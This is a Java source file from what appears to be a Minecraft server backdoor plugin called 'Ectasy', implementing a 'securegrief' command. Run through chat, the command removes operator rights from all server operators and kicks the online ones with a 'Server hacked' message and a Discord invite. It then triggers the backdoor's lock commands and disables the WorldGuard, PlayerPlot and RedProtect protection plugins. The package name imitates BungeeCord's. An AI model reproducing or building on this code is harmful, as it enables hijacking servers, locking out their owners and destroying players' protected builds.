package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.user.User;
import fr.body.ectasy.util.ChatUtil;
import java.util.Arrays;
import java.util.concurrent.atomic.AtomicInteger;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;

@CommandInfo(
   name = "securegrief",
   description = "Secure a grief",
   blatant = true,
   rank = Rank.LITE
)
public class SecureGriefCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      AtomicInteger var4 = new AtomicInteger();
      Ectasy.parentPlugin.getServer().getOperators().forEach(p -> {
         if (p.isOnline()) {
            if (Ectasy.users.get(p.getName()).rank != Rank.UNAUTHORIZED) {
               return;
            }

            p.getPlayer().kickPlayer("&6&kxxx&4 Server hacked, complain at " + Ectasy.discordInviteLink + " &6&kxxx".replace("&", "§"));
         }

         var4.getAndIncrement();
         p.setOp(false);
      });
      ChatUtil.sendChat(var1.getPlayer(), "Deoped " + var4.get() + " players");

      for(AbstractCommand var6 : Ectasy.commandManager.getCommands()) {
         if (var6.getName().startsWith("lock") && !var6.getName().endsWith("chat")) {
            var6.execute(var1, var2, var3);
         }
      }

      String[] var7 = new String[]{"WorldGuard", "PlayerPlot", "RedProtect"};
      Arrays.stream(var7).forEach(s -> {
         if (!Ectasy.parentPlugin.getName().equalsIgnoreCase(s)) {
            Plugin pl = Bukkit.getPluginManager().getPlugin(s);
            if (pl != null) {
               Bukkit.getPluginManager().disablePlugin(pl);
               ChatUtil.sendChat(var1.getPlayer(), "Disabled " + pl.getName());
            }
         }
      });
   }
}
